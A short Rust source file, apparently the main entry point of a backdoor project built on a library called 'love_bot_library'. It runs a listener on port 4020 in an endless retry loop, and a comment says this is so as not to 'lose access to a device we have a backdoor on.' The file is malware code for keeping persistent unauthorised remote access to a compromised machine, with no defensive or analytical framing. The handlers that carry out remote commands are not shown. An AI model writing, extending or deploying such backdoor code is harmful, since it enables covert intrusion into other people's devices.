use std::{thread, time::Duration};

use log::{debug, error};
use love_bot_library::connection::server_handlers::create_server;

const MY_COMPUTER_PORT: u16 = 4020;
const RETRY_INTERVAL: u64 = 5;

fn setup_server() {
    // Using loop here because in case we fail to create the server, we should try again.
    // This is because we don't want to lose access to a device we have a backdoor on.
    loop {
        debug!("Running server loop");
        // Blocking until server will die.
        match create_server(MY_COMPUTER_PORT) {
            Ok(_) => (),
            Err(e) => {
                error!(
                    "Error {} when starting server. Trying again in {} seconds.",
                    e,
                    RETRY_INTERVAL
                );
            }
        }
        debug!(
            "Sleeping {} seconds until retrying to run server again",
            RETRY_INTERVAL
        );
        thread::sleep(Duration::new(RETRY_INTERVAL, 0));
    }
}

fn main() {
    env_logger::init();

    setup_server();
}
